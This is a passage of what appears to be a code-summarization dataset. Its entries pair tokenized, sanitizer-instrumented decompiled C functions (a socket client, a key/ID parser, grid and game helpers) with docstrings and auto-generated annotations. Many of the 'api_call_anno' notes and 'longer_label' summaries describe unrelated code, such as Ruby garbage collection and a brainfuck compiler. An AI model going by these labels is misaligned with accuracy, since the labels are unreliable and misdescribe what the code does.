            "sockfd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "1",
            ")",
            "__asan_report_store2",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            "=",
            "2",
            ";",
            "v4",
            "=",
            "htons",
            "(",
            "0x1388u",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "34",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "34",
            ")",
            "&",
            "7",
            ")",
            "+",
            "1",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "34",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store2",
            "(",
            "v1",
            "+",
            "34",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "34",
            ")",
            "=",
            "v4",
            ";",
            "v5",
            "=",
            "inet_addr",
            "(",
            "\"35.246.6.171\"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "36",
            ")",
            "=",
            "v5",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ",",
            "0x10u",
            ")",
            ">",
            "=",
            "0",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "n",
            "=",
            "read",
            "(",
            "sockfd",
            ",",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ",",
            "0x3FFuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "n",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "n",
            ">",
            "0x3FF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_228DE0",
            ",",
            "n",
            ")",
            ";",
            "v6",
            "=",
            "n",
            "+",
            "1L",
            "L",
            ";",
            "if",
            "(",
            "v6",
            ">",
            "0x400",
            "&",
            "&",
            "v1",
            "+",
            "96",
            "+",
            "n",
            "<",
            "=",
            "v1",
            "+",
            "96",
            "+",
            "n",
            "+",
            "v6",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_228E20",
            ",",
            "v1",
            "+",
            "96",
            "+",
            "n",
            ")",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "96",
            "+",
            "n",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "96",
            "+",
            "n",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v7",
            ")",
            "__asan_report_store1",
            "(",
            "v1",
            "+",
            "96",
            "+",
            "n",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "1184",
            "+",
            "n",
            "-",
            "1088",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "response",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_229100",
            ")",
            ";",
            "strcat",
            "(",
            "response",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"\\n Error : Connect Failed!\"",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"\\n Error : Could not create socket \"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v10",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v1",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8088",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v3",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v3",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v3",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_5",
            "(",
            "v1",
            ",",
            "1152L",
            "L",
            ",",
            "v10",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function appears to be used for implementing a stack data structure, with different code snippets showing its usage in various contexts such as for managing stack data, runtime stack, and stack nodes in a binary search tree.",
            "The `malloc` function, commonly used for dynamic memory allocation in C programming, is being redefined here to utilize `GlobalAlloc` for memory allocation while the provided code snippets include implementations of various algorithms and data structures like a recursive function for generating trees, string manipulation functions, and mathematical algorithms like binary search and Mandelbrot set calculation.",
            "The function `__readfsqword` is used to read an unsigned 64-bit integer value from a specific offset within the FS segment, typically used in low-level system programming for accessing thread information or other kernel data structures on x86 architectures."
        ],
        "longer_label": "The provided code appears to be a complex C function involving dynamic memory allocation, socket communication, and potential security checks, possibly part of a larger system involving network communication and data manipulation, with annotations indicating its use in implementing various algorithms and data structures."
    },
    {
        "id": 205,
        "docstring_tokens": [
            "This",
            "function",
            "extracts",
            "a",
            "key",
            "and",
            "ID",
            "from",
            "a",
            "response",
            "and",
            "stores",
            "them",
            "in",
            "a",
            "key_id",
            "structure",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "key_id_0",
            "*",
            "ki",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "char",
            "*",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "char",
            "*",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "char",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "bool",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "int",
            "poz",
            ";",
            "int",
            "id",
            ";",
            "int",
            "ida",
            ";",
            "int",
            "i",
            ";",
            "char",
            "*",
            "p",
            ";",
            "char",
            "v19",
            "[",
            "30072",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v20",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v19",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v2",
            "=",
            "__asan_stack_malloc_9",
            "(",
            "30048L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "v3",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "30080",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 30000 8 response \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "16",
            ")",
            "=",
            "getKeyId",
            ";",
            "v4",
            "=",
            "v1",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147454632",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v20",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "getResp",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ")",
            ";",
            "v5",
            "=",
            "strchr",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ",",
            "33",
            ")",
            ";",
            "p",
            "=",
            "v5",
            ";",
            "v6",
            "=",
            "(",
            "_DWORD",
            ")",
            "v5",
            "-",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "v5",
            ",",
            "v1",
            "+",
            "32",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_228F80",
            ",",
            "v5",
            ",",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "poz",
            "=",
            "v6",
            ";",
            "if",
            "(",
            "ki",
            "=",
            "=",
            "(",
            "key_id_0",
            "*",
            ")",
            "-",
            "4L",
            "L",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_229160",
            ")",
            ";",
            "if",
            "(",
            "p",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "-",
            "1L",
            "L",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2291C0",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ki",
            "-",
            ">",
            "key",
            ",",
            "p",
            "+",
            "1",
            ")",
            ";",
            "id",
            "=",
            "0",
            ";",
            "i",
            "=",
            "0",
            ";",
            "while",
            "(",
            "poz",
            ")",
            "{",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "poz",
            ",",
            "1",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_228FC0",
            ",",
            "poz",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "-",
            "-",
            "poz",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0xAu",
            ",",
            "id",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_229000",
            ",",
            "id",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "ida",
            "=",
            "10",
            "*",
            "id",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0x752F",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_228E80",
            ",",
            "i",
            ")",
            ";",
            "v7",
            "=",
            "i",
            "+",
            "1L",
            "L",
            ";",
            "if",
            "(",
            "v7",
            ">",
            "0x7530",
            "&",
            "&",
            "v1",
            "+",
            "32",
            "+",
            "i",
            "<",
            "=",
            "v1",
            "+",
            "32",
            "+",
            "i",
            "+",
            "v7",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_228EC0",
            ",",
            "v1",
            "+",
            "32",
            "+",
            "i",
            ")",
            ";",
            "v8",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            "+",
            "i",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "32",
            "+",
            "i",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v8",
            ")",
            "__asan_report_load1",
            "(",
            "v1",
            "+",
            "32",
            "+",
            "i",
            ")",
            ";",
            "v9",
            "=",
            "v3",
            "[",
            "i",
            "-",
            "30048",
            "]",
            ";",
            "v10",
            "=",
            "__OFSUB__",
            "(",
            "v9",
            ",",
            "48",
            ")",
            ";",
            "v11",
            "=",
            "v9",
            "-",
            "48",
            ";",
            "if",
            "(",
            "v10",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_229040",
            ",",
            "v3",
            "[",
            "i",
            "-",
            "30048",
            "]",
            ",",
            "48L",
            "L",
            ")",
            ";",
            "v12",
            "=",
            "v11",
            ";",
            "v10",
            "=",
            "__OFADD__",
            "(",
            "v11",
            ",",
            "ida",
            ")",
            ";",
            "v13",
            "=",
            "v11",
            "+",
            "ida",
            ";",
            "if",
            "(",
            "v10",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_229080",
            ",",
            "ida",
            ",",
            "v12",
            ")",
            ";",
            "id",
            "=",
            "v13",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2290C0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "+",
            "+",
            "i",
            ";",
            "}",
            "if",
            "(",
            "!",
            "ki",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ki",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_228F20",
            ",",
            "ki",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ki",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ki",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ki",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "ki",
            ")",
            ";",
            "}",
            "ki",
            "-",
            ">",
            "id",
            "=",
            "id",
            ";",
            "if",
            "(",
            "v19",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v1",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8EA4",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v4",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "3756",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_9",
            "(",
            "v1",
            ",",
            "30048L",
            "L",
            ",",
            "v19",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named \"stack\" likely serves to implement or manage a stack data structure, potentially for various purposes such as maintaining execution environments, handling JavaScript function lists, or managing binary search tree nodes.",
            "The function ` function named \"malloc\" appears to be an implementation of dynamic memory allocation in C, overriding the standard library function, by utilizing the Windows API function GlobalAlloc with GMEM_ZEROINIT flag to allocate memory and initialize it to zero.",
            "The function `__readfsqword` is used to read an unsigned 64-bit integer (unsigned __int64) value from the FS (file system) segment register at a specified offset, primarily utilized in low-level system programming for tasks like accessing thread information blocks (TIBs) or other system-specific data structures."
        ],
        "longer_label": "The code defines a function `getKeyId` that retrieves a response, parses it to extract a key, performs arithmetic operations on the key characters, stores the result in a structure, and handles memory allocation and deallocation with annotations suggesting potential purposes of functions like managing a stack, implementing dynamic memory allocation, and accessing system-specific data structures."
    },
    {
        "id": 206,
        "docstring_tokens": [
            "The",
            "function",
            "initializes",
            "a",
            "2D",
            "array",
            "'",
            "p",
            "'",
            "of",
            "size",
            "n",
            "x",
            "m",
            "with",
            "the",
            "value",
            "'empty",
            "'",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "int",
            "n",
            ",",
            "const",
            "int",
            "m",
            ",",
            "cell_0",
            "(",
            "*",
            "p",
            ")",
            "[",
            "]",
            ")",
            "{",
            "char",
            "*",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "char",
            "v5",
            ";",
            "char",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "int",
            "j",
            ";",
            "int",
            "i",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22C120",
            ",",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "n",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "m",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v3",
            "=",
            "(",
            "char",
            "*",
            ")",
            "p",
            "+",
            "16",
            "*",
            "i",
            "*",
            "(",
            "__int64",
            ")",
            "m",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22C160",
            ",",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "j",
            ">",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "m",
            "-",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22BF60",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v3",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22BFA0",
            ",",
            "v3",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v4",
            ")",
            "__asan_report_store1",
            "(",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "]",
            ")",
            ";",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "v3",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C000",
            ",",
            "v3",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "4",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v5",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "v3",
            "+",
            "16",
            "*",
            "j",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v5",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "4",
            "]",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "4",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "v3",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C060",
            ",",
            "v3",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "8",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "v3",
            "+",
            "16",
            "*",
            "j",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v6",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "8",
            "]",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "8",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "v3",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C0C0",
            ",",
            "v3",
            ")",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "12",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "v3",
            "+",
            "16",
            "*",
            "j",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v7",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "12",
            "]",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "v3",
            "[",
            "16",
            "*",
            "j",
            "+",
            "12",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22C1A0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22C1E0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `ubsan_handle_sub_overflow` is part of the Undefined Behavior Sanitizer (UBSan) library, designed to handle cases where a subtraction operation results in overflow, providing mechanisms for detecting and managing such occurrences in instrumented code.",
            "The function `of_bounds` appears to be a placeholder or a template function name used in a code snippet to define error messages or constants related to string formatting and error handling for a text editor or similar software application.",
            "The `handle` function seems to be part of a larger codebase, possibly related to input device management, networking error handling, and UTF-8 string manipulation, potentially serving as a central function for creating an interception context and defining error codes and mechanisms for handling networking errors and UTF-8 strings.",
            "The `mismatch` function is likely used for error handling in a C program, specifically to handle cases where there's a mismatch or inconsistency detected, such as bracket mismatch in a brainfuck compiler, initialization mismatches in system variables, or version mismatches in RPC programs, by printing an error message and exiting the program.",
            "The `report` function seems to be responsible for generating and printing out garbage collection (gc) related statistics and debug information, including memory allocation and deallocation events, as well as profiling data, within the context of a Ruby interpreter.",
            "The function `storeN` is designed to store a given value `v` into memory `mem` starting from address `addr` for `n` consecutive bytes, where each byte of `v` is stored in consecutive memory locations, shifting `v` right by 8 bits in each iteration, ensuring each byte of `v` is stored in a separate memory location."
        ],
        "longer_label": "The provided code is a C function with annotations indicating its usage of functions related to detecting and handling overflow and type mismatch errors, likely within a larger codebase involving input device management, networking error handling, and UTF-8 string manipulation."
    },
    {
        "id": 207,
        "docstring_tokens": [
            "This",
            "code",
            "checks",
            "if",
            "all",
            "cells",
            "in",
            "each",
            "row",
            "of",
            "a",
            "game",
            "grid",
            "are",
            "in",
            "a",
            "specific",
            "state",
            "and",
            "returns",
            "the",
            "index",
            "of",
            "the",
            "row",
            "that",
            "meets",
            "this",
            "condition",
            ",",
            "or",
            "-1",
            "if",
            "none",
            "do",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "bool",
            "v2",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "int",
            "s",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C3C0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
